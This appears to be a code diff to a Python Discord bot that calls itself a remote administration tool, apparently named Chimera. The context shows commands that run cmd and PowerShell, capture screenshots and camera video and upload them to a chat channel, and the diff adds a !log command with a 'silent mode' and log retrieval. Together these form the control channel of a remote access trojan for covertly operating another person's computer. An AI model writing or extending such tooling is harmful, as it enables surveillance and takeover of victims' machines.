@@ -23,6 +23,9 @@ from lib.helpers import get_operating
 # Dependency of media
 from lib.helpers import MediaControlAdapter
 
+# Dependency of log
+from datetime import datetime
+
 # Platform name
 operating_sys = get_operating()
 
@@ -30,7 +33,7 @@ operating_sys = get_operating()
 client = Bot(description="A remote administration tool for discord",
              command_prefix="!", pm_help=False)
 
-from lib.helpers import logger
+from lib.helpers import Logger
 
 # Used by !screenshot and !camera commands
 import configs as Configs
@@ -271,7 +274,7 @@ async def camera(ctx, command, time=5):
         await client.send_file(ctx.message.channel, 'video.avi')
     
     
-
+    
 # Module: echo
 # Description: Turns command output display to discord chat on and off (works for !cmd and !powershell)
 # Usage: !echo off or !echo on
@@ -286,5 +289,26 @@ async def echo(status):
         await client.say("!cmd and !powershell output will be hidden from chat. ")
     else:
         await client.say("Parameter of echo can be off or on. ")
+
+# Module: log
+# Description: Turns on of off logs in chat. Also can be used to retrieve Chimera execution logs
+# Usage: !log [off|on] | [show] [date (format: YYYY-MM-DD)]
+# Dependencies: None
+@client.command()
+@Logger(client)
+async def log(param, date=None):
+    if param == "on":
+        Configs.discord_logs_enabled = True
+        await client.say("Exceptions log will now be displayed in chat.")
+    elif param == "off":
+        Configs.discord_logs_enabled = False
+        await client.say("Running on silent mode now.")
+    elif param == "show":
+        date = date if date else (datetime.now()).strftime('%Y-%m-%d')
+        file = open('{}/{}.txt'.format(Logger.DIRECTORY,date),'r')
+        log_text = file.read()
+        await client.say(log_text)
+    else:
+        await client.say("Parameter of !log can be off or on. ")
 
 client.run(Configs.BOT_TOKEN)
